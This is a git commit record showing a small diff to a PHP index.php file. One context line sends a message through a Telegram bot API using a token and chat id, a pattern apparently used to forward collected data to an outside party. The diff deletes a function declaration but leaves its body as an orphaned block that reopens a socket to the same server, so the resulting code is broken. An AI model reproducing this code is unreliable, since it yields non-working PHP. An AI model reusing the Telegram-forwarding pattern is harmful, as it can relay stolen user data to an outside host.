62999e5a1ef61992ba32d03503028ce3e5b04a78
ImSaleza <125234718+iroelds99@users.noreply.github.com>
2023-11-30 01:03:37 +0100

    Update index.php

--- index.php
+++ index.php
@@ -51,7 +51,6 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_
 
     flush();
 }
-function shutdwn_function($lock)
 {
     $a = fsockopen((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] ? 'tls' : 'tcp').'://'.$_SERVER['SERVER_NAME'], $_SERVER['SERVER_PORT']);
     fwrite($a, $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n".'Host: '.$_SERVER['SERVER_NAME']."\r\n\r\n");
